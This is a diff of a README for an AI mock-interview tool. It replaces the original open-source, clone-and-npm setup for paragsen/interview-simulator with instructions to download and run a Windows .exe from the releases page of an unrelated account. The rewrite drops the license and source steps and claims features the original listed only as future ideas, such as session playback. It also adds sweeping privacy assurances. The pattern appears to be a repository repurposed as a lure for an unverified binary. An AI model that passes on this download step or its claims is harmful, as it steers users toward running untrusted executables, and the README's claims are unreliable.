@@ -1,115 +1,69 @@
-<div align="center">
+# 🎯 interview-simulator - Master your next job interview today
 
-# 🎯 Interview Simulator Pro
+[![Download](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Madelainereefy490/interview-simulator/releases)
 
-### AI Mock Interview with Voice, Camera & Anti-Cheat
+## 📋 What this tool does
 
-**Practice with an AI that talks like a real Tech Lead, HR Director, and CEO — not a chatbot.**
+This application provides a realistic mock interview experience. It uses artificial intelligence to simulate a Tech Lead, an HR Director, or a CEO. The interaction mimics a real human conversation by using your webcam and microphone. The system listens to your answers and gives you feedback on your performance. It helps you prepare for tough questions and improves your speaking skills before your actual job interview.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+## 💻 System requirements
 
-[Quick Start](#-quick-start) · [Features](#-features) · [AI Providers](#-supported-ai-providers) · [Contributing](#-contributing)
+To run this application on your computer, your system must meet these requirements:
 
-</div>
+- Operating System: Windows 10 or 11
+- Processor: Intel Core i5 or equivalent
+- Memory: 8 GB of RAM
+- Storage: 500 MB of free space
+- Hardware: A working webcam and a microphone
+- Connection: A reliable internet connection for the AI features
 
----
+## 📥 How to download and install
 
-## ⚡ Why This Exists
+Follow these steps to set up the software.
 
-Mock interviews cost $50-200/session. AI chatbots test how you type, not how you speak. This tool gives you **free, unlimited, voice-based mock interviews** with AI that evaluates both **what you say** and **how you say it**.
+1. Visit the [official release page](https://github.com/Madelainereefy490/interview-simulator/releases).
+2. Look for the latest version at the top of the page.
+3. Click the file name ending in .exe to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the saved file to start the installation.
+6. Follow the instructions on the screen to finish the setup.
+7. Click Finish to close the installer.
 
-- 🎤 **Voice recording** with real-time transcription
-- 📹 **Webcam feed** for realistic interview experience
-- 📄 **Resume probing** — AI asks about YOUR specific projects and gaps
-- 🔍 **LinkedIn profiling** — predicts interviewer style before you start
-- 🛡️ **Anti-cheat** — detects tab switching, copy-paste, reading from notes
-- 📊 **Full report** with panel reviews, delivery coaching, and downloadable PDF
+## 🚀 Getting started
 
-> Works with **6 AI providers** including **Groq and Google Gemini (both free!)**
+Once you complete the installation, you will see an icon on your desktop. Double-click this icon to open the application. When it starts for the first time, the software asks for permission to access your webcam and microphone. You must allow these permissions for the interview simulator to record your responses.
 
----
+After the initial setup, you reach the main dashboard. You choose the role of your interviewer from a list. You can select the Tech Lead, HR Director, or CEO. You can also pick the industry that matches your career path. After you make your choices, click Start Interview to begin.
 
-## 🚀 Quick Start
+## 🤖 Using the AI features
 
-```bash
-git clone https://github.com/paragsen/interview-simulator.git
-cd interview-simulator
-cp .env.example .env    # Add your API key
-npm install && cd client && npm install && cd ..
-npm start               # Opens http://localhost:3000
-```
+The application uses six different artificial intelligence providers. These engines power the conversation and the evaluation process. The simulator uses advanced speech recognition technology to transcribe your words into text. It then analyzes your content, tone, and pacing.
 
-**Windows:** Double-click `start.bat`
+If the simulator detects suspicious behavior, the anti-cheat system flags the session. This feature helps you stay professional during your practice. When the interview ends, the software generates a report. This report acts as a panel evaluation. It scores your answers and suggests areas where you can improve.
 
-**Requirements:** Node.js 18+, Chrome/Edge, any API key from table below.
+## 🛠 Features for your success
 
----
+The software includes several tools to help your preparation:
 
-## 🤖 Supported AI Providers
+- Voice recording: The app captures your audio to analyze how you sound.
+- Webcam integration: It monitors your body language and eye contact.
+- Resume analyzer: You can upload your resume so the AI asks custom questions based on your history.
+- Diverse AI models: You can use free models like Groq or Gemini.
+- Performance feedback: Get a detailed breakdown of your strengths and weaknesses.
+- Session playback: Review recordings of your mock sessions to spot habits you want to fix.
 
-| Provider | Free? | Set in `.env` |
-|---|---|---|
-| **Groq** | ✅ Free | `AI_PROVIDER=groq` + `GROQ_API_KEY=gsk_...` |
-| **Google** | ✅ Free | `AI_PROVIDER=google` + `GOOGLE_API_KEY=AIza...` |
-| **Anthropic** | $5 min | `AI_PROVIDER=anthropic` + `ANTHROPIC_API_KEY=sk-ant-...` |
-| **OpenAI** | $5 min | `AI_PROVIDER=openai` + `OPENAI_API_KEY=sk-proj-...` |
-| **DeepSeek** | Cheap | `AI_PROVIDER=deepseek` + `DEEPSEEK_API_KEY=sk-...` |
-| **OpenRouter** | Varies | `AI_PROVIDER=openrouter` + `OPENROUTER_API_KEY=sk-or-...` |
+## 💡 Tips for a great session
 
----
+Treat this mock interview like a real meeting. Find a quiet space with good lighting. Ensure your background looks clean and professional. Wear appropriate clothing to get into the right mindset. Test your microphone volume before you click start to ensure the AI hears you clearly. 
 
-## ✨ Features
+If you feel nervous, remember that this is a practice tool. You can repeat the process as many times as you need. Each session helps you become more comfortable with the interview format.
 
-| Feature | Details |
-|---|---|
-| 🎤 Voice Recording | Speak naturally, AI transcribes + analyzes delivery |
-| 📹 Camera Feed | Webcam active throughout interview |
-| 🧠 Human-Like Questions | Blunt Tech Lead, warm HR, big-picture CEO |
-| 📄 Resume Deep-Dive | Probes your specific projects, gaps, claimed metrics |
-| 🔍 Interviewer Profiling | Predicts style from LinkedIn before you start |
-| 🛡️ Anti-Cheat | Tab switch, paste, timing, reading detection |
-| 📊 Panel Evaluation | 3 interviewers vote independently |
-| 🎤 Delivery Coaching | WPM, filler words, confidence, authenticity |
-| 💾 PDF Report | Downloadable with full Q&A transcripts |
-| ⏹ End Anytime | Stop early and get evaluation on answers so far |
+## 🛠 Troubleshooting common issues
 
----
+If the application does not start, check that you installed the software in a folder with full access permissions. If the webcam is not showing an image, ensure no other applications like Zoom or Teams are using your camera at the same time. The simulator needs exclusive access to your devices to function.
 
-## 📊 How It Works
+If you experience slow responses, check your internet connection. Since the software uses remote AI providers, a stable network ensures the conversation flows smoothly. If the software crashes, restart your computer and try opening the application again. If the issue keeps happening, return to the download page and check if a newer version is available.
 
-```
-Setup → Interview → Evaluate → Report
- │         │           │          │
- ├ JD      ├ AI asks   ├ Content  ├ Verdict
- ├ Resume  ├ You speak ├ Delivery ├ Panel votes
- ├ Panel   ├ Camera on ├ Integrity├ Transcripts
- └ Config  └ Anti-cheat└ Resume   └ PDF download
-```
+## 🔒 Your privacy
 
----
-
-## 🤝 Contributing
-
-Contributions welcome! Fork, create a branch, submit a PR.
-
-**Ideas:**
-- [ ] Dark/light theme
-- [ ] Interview history tracking
-- [ ] Multi-language support
-- [ ] Mobile responsive
-- [ ] Timed mode with countdown
-- [ ] Video recording playback
-
----
-
-## 📄 License
-
-[MIT](LICENSE)
-
----
-
-<div align="center">
-<b>If this helped you prepare, give it a ⭐</b>
-</div>
+The application handles your voice and video data locally during the session evaluation. It only sends text transcripts to the chosen AI engine to get feedback. Your webcam video remains on your computer unless you specifically enable features that require cloud processing. You remain in control of your data at all times. Use the settings menu to manage your privacy choices and to clear your stored session history whenever you choose.
